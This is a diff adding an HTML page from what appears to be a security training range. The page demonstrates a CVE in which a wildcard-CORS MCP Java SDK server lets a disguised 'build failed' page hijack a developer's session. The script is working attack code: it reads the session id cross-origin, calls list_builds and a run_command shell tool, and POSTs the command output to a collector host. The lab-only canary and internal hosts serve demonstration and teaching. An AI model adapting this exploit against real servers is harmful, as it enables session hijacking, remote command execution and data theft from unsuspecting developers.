@@ -1,0 +1,201 @@
+<!doctype html>
+<!--
+  demo.html - the VISIBLE, PACED variant of the drive-by (Meridian Range · module 01 · CVE-2026-34237).
+
+  ⛔ LAB-ONLY. Same real attack as remote.html (targets mcp.lab.consulereit.nl across labnet), but built to be
+     *watched*: it un-hides the attacker's transcript, narrates each step, and paces itself to ~30s so a
+     screen recording is legible. BENIGN canary only; exfil to the labnet-internal collector - nothing
+     leaves the lab (SCOPE #2/#4). Do not serve it anywhere with a route to a real MCP server.
+
+  Split view: the LEFT pane is what the victim sees (an innocent "build failed" card); the RIGHT pane is
+  the attacker's script, which in the real page (remote.html) is display:none. Faithful to CVE-2026-34237:
+  the affected MCP Java SDK transport answers the cross-origin SSE read with Access-Control-Allow-Origin:*,
+  so the page reads the `endpoint` event, lifts the session id, and relays JSON-RPC over CORS-simple
+  text/plain POSTs (responses on the SSE stream). Against a patched server the cross-origin SSE read is
+  refused, so no endpoint event arrives, no session is lifted, and nothing is exfiltrated.
+
+  The operator-side page recorder waits for window.__DEMO_DONE before it stops recording.
+-->
+<meta charset="utf-8" />
+<title>Meridian CI · build #4209</title>
+<style>
+  :root { color-scheme: light; }
+  * { box-sizing: border-box; }
+  body { font: 15px/1.55 system-ui, sans-serif; margin: 0; background: #0e1420; color: #1c2530; }
+  .stage { width: 960px; min-height: 600px; margin: 0 auto; padding: 22px 24px 26px; }
+  .title { color: #cdd7e5; font-weight: 600; font-size: 15px; letter-spacing: .2px; }
+  .title b { color: #fff; }
+  .title .tag { color: #7f8ea3; font-weight: 500; }
+  .grid { display: grid; grid-template-columns: 360px minmax(0, 1fr); gap: 18px; margin-top: 16px; }
+  .paneLabel { color: #7f8ea3; font-size: 12px; text-transform: uppercase; letter-spacing: .8px; margin: 0 0 8px 2px; }
+
+  /* victim pane */
+  .victim { background: #fff; border-radius: 10px; padding: 18px 20px; }
+  .victim .hdr { color: #b00020; font-weight: 600; margin: 0 0 8px; }
+  .victim p { margin: 6px 0; }
+  .victim code { background: #f5f7fa; padding: 1px 5px; border-radius: 4px; }
+  .oblivious { color: #8a97a6; font-size: 12px; margin-top: 14px; font-style: italic; }
+
+  /* attacker console pane */
+  .console { background: #0a0f18; border: 1px solid #1e2c40; border-radius: 10px; padding: 16px 18px;
+             font: 14px/1.5 ui-monospace, "SF Mono", Menlo, monospace; color: #b9c6d6; min-height: 430px;
+             overflow-wrap: anywhere; word-break: break-word; }
+  .console > div { margin: 2px 0; }
+  .console .step { color: #6ea8ff; }
+  .console .ok  { color: #57d68a; }
+  .console .bad { color: #ff6b6b; }
+  .console .dim { color: #6b7a8d; }
+  .console pre { margin: 3px 0 10px; white-space: pre-wrap; }
+  .caret::after { content: "▍"; color: #6ea8ff; animation: blink 1s steps(1) infinite; }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  .caption { margin-top: 16px; color: #9fb0c4; font-size: 13.5px; min-height: 20px; }
+  .verdict { margin-top: 14px; font-weight: 700; font-size: 20px; letter-spacing: .4px; visibility: hidden; }
+  .verdict.attack { color: #57d68a; }
+  .verdict.norepro { color: #ff6b6b; }
+</style>
+
+<div class="stage">
+  <div class="title">
+    <b>Meridian Range</b> · module 01 <span class="tag">- wildcard-CORS MCP session hijack (CVE-2026-34237, MCP Java SDK)</span>
+  </div>
+
+  <div class="grid">
+    <div>
+      <p class="paneLabel">What the victim sees</p>
+      <div class="victim">
+        <p class="hdr">✗ nightly-e2e · build #4209 failed</p>
+        <p><b>main</b> @ <code>b90aa11</code> - e2e: checkout → pay flow timed out after 30000ms.</p>
+        <p>42 passed · 1 failing. This is a shared status link; sign in to Meridian CI to re-run.</p>
+        <p class="oblivious" id="oblivious">The developer just clicked a "build failed" link and is reading this page.</p>
+      </div>
+    </div>
+
+    <div>
+      <p class="paneLabel">Attacker script running in the same tab (hidden in the real page)</p>
+      <div class="console" id="con"></div>
+    </div>
+  </div>
+
+  <div class="caption" id="cap"></div>
+  <div class="verdict" id="verdict"></div>
+</div>
+
+<script>
+  // ── real attack wiring (identical targets to remote.html) ──────────────────────────────
+  const TARGET    = "http://mcp.lab.consulereit.nl:8080";                     // buildbot-mcp across labnet
+  const SSE       = TARGET + "/mcp/sse";
+  const COLLECTOR = "http://collector.lab.consulereit.nl:9000/pwned";
+  const CANARY    = "id; hostname; echo LAB_CANARY_$$";              // benign proof-of-exec only
+
+  // ── pacing / rendering helpers (the only thing added over the real page) ───────────────
+  const con = document.getElementById("con");
+  const cap = document.getElementById("cap");
+  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+  function line(html, cls = "") {
+    const div = document.createElement("div");
+    if (cls) div.className = cls;
+    div.innerHTML = html;
+    con.appendChild(div);
+    con.scrollTop = con.scrollHeight;
+    return div;
+  }
+  function block(text) {
+    const pre = document.createElement("pre");
+    pre.className = "dim";
+    pre.textContent = text;
+    con.appendChild(pre);
+    con.scrollTop = con.scrollHeight;
+  }
+  async function caption(t) { cap.textContent = t; await sleep(300); }
+
+  function done(state) {
+    const v = document.getElementById("verdict");
+    if (state === "ATTACK-OK") {
+      v.textContent = "● ATTACK-OK - foreign origin read the session id and drove run_command";
+      v.className = "verdict attack";
+    } else {
+      v.textContent = "● NO-REPRO - cross-origin SSE read refused, no session, nothing exfiltrated";
+      v.className = "verdict norepro";
+    }
+    v.style.visibility = "visible";
+    window.__DEMO_DONE = state;
+  }
+
+  // ── dual-channel MCP over CORS-simple requests ─────────────────────────────────────────
+  const pending = new Map();
+  let messageUrl = null, sessionId = null, nextId = 1, leaked = false, driven = false, finished = false;
+
+  const post = (body) =>
+    fetch(messageUrl, { method: "POST", headers: { "content-type": "text/plain" }, body: JSON.stringify(body) }).catch(() => {});
+  const rpc = (method, params) =>
+    new Promise((resolve) => { const id = nextId++; pending.set(id, resolve); post({ jsonrpc: "2.0", id, method, params }); });
+
+  const es = new EventSource(SSE);
+  es.addEventListener("endpoint", (e) => {
+    leaked = true;
+    messageUrl = new URL(e.data, SSE).toString();
+    sessionId = new URL(messageUrl).searchParams.get("sessionId");
+    run();
+  });
+  es.addEventListener("message", (e) => {
+    try { const m = JSON.parse(e.data); if (m.id != null && pending.has(m.id)) { pending.get(m.id)(m); pending.delete(m.id); } } catch {}
+  });
+
+  // A patched server refuses the cross-origin SSE read: EventSource errors and no `endpoint` event ever
+  // arrives. If nothing has leaked shortly after load, render the NO-REPRO story.
+  setTimeout(() => { if (!leaked) noRepro(); }, 7000);
+
+  async function noRepro() {
+    if (driven || finished) return; finished = true;
+    try { es.close(); } catch {}
+    line('<span class="step">①</span> cross-origin <b>SSE read</b> → ' + SSE + ' <span class="dim">(Origin: http://attacker.lab.consulereit.nl)</span>');
+    await caption("The server did not answer the cross-origin read with Access-Control-Allow-Origin: *. The browser refuses the read.");
+    await sleep(2400);
+    line('<span class="bad">✗</span> no <b>endpoint</b> event readable - the session id cannot be lifted');
+    await sleep(2400);
+    line('<span class="dim">recon, run_command and exfil never happen.</span>');
+    await sleep(2000);
+    await caption("Nothing reached the attacker collector - the attack did not reproduce.");
+    done("NO-REPRO");
+  }
+
+  async function run() {
+    if (driven || finished) return; driven = true;
+    await sleep(1500);
+    await caption("attacker.lab.consulereit.nl loads. It looks like a build-status page - but its script opens an SSE stream to the developer's buildbot-mcp.");
+    line('<span class="step">①</span> cross-origin <b>SSE read</b> → ' + SSE + ' <span class="dim">(Origin: http://attacker.lab.consulereit.nl)</span>');
+    await sleep(3200);
+
+    await caption("Wildcard CORS let attacker.lab.consulereit.nl READ the SSE stream - including the endpoint event the transport should never expose cross-origin.");
+    line('<span class="ok">✓</span> read the <b>endpoint</b> event, lifted <b>sessionId</b>: <span class="dim">' + sessionId + '</span>');
+    await sleep(4200);
+
+    await rpc("initialize", { protocolVersion: "2024-11-05", capabilities: {}, clientInfo: { name: "attacker.lab.consulereit.nl", version: "0.0.0" } });
+    post({ jsonrpc: "2.0", method: "notifications/initialized" });
+
+    line('<span class="step">②</span> recon through the hijacked session → <b>list_builds</b>');
+    await caption("With the session, the page calls tools as if it were the developer's own client.");
+    const recon = await rpc("tools/call", { name: "list_builds", arguments: {} });
+    block(recon.result?.content?.[0]?.text ?? "");
+    await sleep(5000);
+
+    line('<span class="step">③</span> drive the privileged build-step tool → <b>run_command</b> <span class="dim">(id; hostname; echo LAB_CANARY)</span>');
+    await caption("run_command is a shell surface exposed to CI. The foreign page now controls it.");
+    const out = (await rpc("tools/call", { name: "run_command", arguments: { cmd: CANARY } })).result?.content?.[0]?.text ?? "";
+    block(out);
+    const exec = /LAB_CANARY/.test(out);
+    await sleep(3200);
+
+    line('<span class="step">④</span> exfiltrate the canary → collector.lab.consulereit.nl:9000');
+    fetch(COLLECTOR, { method: "POST", headers: { "content-type": "text/plain" },
+      body: JSON.stringify({ module: "01-cors-hijack-demo", sessionId, output: out }) }).catch(() => {});
+    line('<span class="ok">✓ exfiltrated</span> - the developer never saw a thing.');
+    await caption("One click on a link. No published port, no exploit payload - just a browser and a wildcard CORS policy.");
+    await sleep(1800);
+    finished = true;
+    try { es.close(); } catch {}
+    done(exec ? "ATTACK-OK" : "NO-REPRO");
+  }
+</script>
